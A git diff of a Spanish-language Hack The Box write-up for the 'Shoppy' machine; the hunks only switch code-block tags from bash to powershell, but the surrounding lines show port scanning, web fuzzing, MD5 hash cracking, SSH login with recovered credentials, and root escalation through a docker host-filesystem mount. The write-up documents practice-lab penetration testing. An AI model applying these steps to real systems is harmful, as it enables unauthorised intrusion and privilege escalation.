@@ -10,7 +10,7 @@ slug: 'box/shoppy'
 
 Empezamos con un escaneo de todos los puertos con <Anchor src='https://github.com/RustScan/RustScan'>RustScan</Anchor>.
 
-```bash
+```powershell
 ❯ rustscan -a 10.10.11.180 -- -sS -n -Pn
 The Modern Day Port Scanner.
 ________________________________________
@@ -48,7 +48,7 @@ Raw packets sent: 3 (queteimportaB) | Rcvd: 3 (queteimportaB)
 
 Descubrimos tres puertos abiertos, proseguimos con el siguiete escaneo.
 
-```bash
+```powershell
 ❯ rustscan -a 10.10.11.180 -p22,80,9093 -- -sCV
 The Modern Day Port Scanner.
 ________________________________________
@@ -115,7 +115,7 @@ src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_htb_1_
 vemos un contador, y nada en el código fuente. Intentemos empezando por un fuzzing a <i>shoppy.htb/FUZZ</i> y buscar subdominios en
 <i>FUZZ.shoppy.htb</i>.
 
-```bash
+```powershell
 ❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://shoppy.htb/FUZZ -fw 853
 
 v1.5.0-dev
@@ -172,7 +172,7 @@ src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_export
 
 vemos dos usuarios con sus contraseñas seguramente encriptadas(md5) toca sacar el <i>hashcat</i> o el <i>john</i>, ingresamos los hashes a nuestro archivo hash y proseguimos de manera sencilla...
 
-```bash
+```powershell
 ❯ cat hash
 23c6877d9e2b564ef8b32c3a23de27b2
 6ebcea65320589ca4f2f1ce039975995
@@ -206,7 +206,7 @@ c/htb/shoppy took 17s
 ✨hash ROTO❤️ <i>remembermethisway</i> contraseña para el usuario <i>josh</i>.
 Cuando empezamos a hacer fuzzing a <i>http://shoppy/login</i> no es mala idea también hacerlo a <i>http://FUZZ.shoppy.login</i>.
 
-```bash
+```powershell
 ❯ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -fw 5
 ...
 ________________________________________________
@@ -249,7 +249,7 @@ vemos cuatro apartados que son interesantes que los leas yo te lo resumiré:
 
 Ingresamos por ssh:
 
-```bash
+```powershell
 ❯ ssh jaeger@shoppy.htb
 ❯ jaeger@shoppy.htb's password:
 ❯ jaeger@shoppy:~$ ls
@@ -267,7 +267,7 @@ User jaeger may run the following commands on shoppy:
 
 podemos ejecutar un archivo <i>/home/deploy/password-manager</i> con el usuario deploy
 
-```bash
+```powershell
 ❯ ssh jaeger@shoppy.htb
 ❯ jaeger@shoppy.htb's password:
 ❯ jaeger@shoppy:~$ ls
@@ -300,7 +300,7 @@ drwx------ 2 deploy deploy 4.0K Sep 22 14:55 .ssh
 
 tenemos permisos de lectura a password-manager lo cual es interesante 💅🏻, vemos que tipo de archivo es antes de seguir con <i>file</i>: Es un binario LSB ejecutable.
 
-```bash
+```powershell
 ❯ jaeger@shoppy:/home/deploy$ file password-manager
 password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
 
@@ -310,7 +310,7 @@ password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynam
 
 De toda la tralla que nos boto el comando <i>cat</i> se filtró una contraseña <i>Sample</i>, proseguimos con el usuario deploy que tiene acceso al contenedor docker:
 
-```bash
+```powershell
 ❯ jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
 [sudo] password for jaeger:
 Welcome to Josh password manager!
@@ -336,7 +336,7 @@ ffe961feb55a   alpine    "chroot /mnt sh"   2 minutes ago   Up 2 minutes        
 vemos una imagen alpine que permite hacer root a <i>/mnt</i> si podemos montar toda la raíz en nuestro fichero, seremos root.
 🌴 El flag -v es de volum que es parecido a mount en Docker.
 
-```bash
+```powershell
 ❯$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ❯# whoami
 root
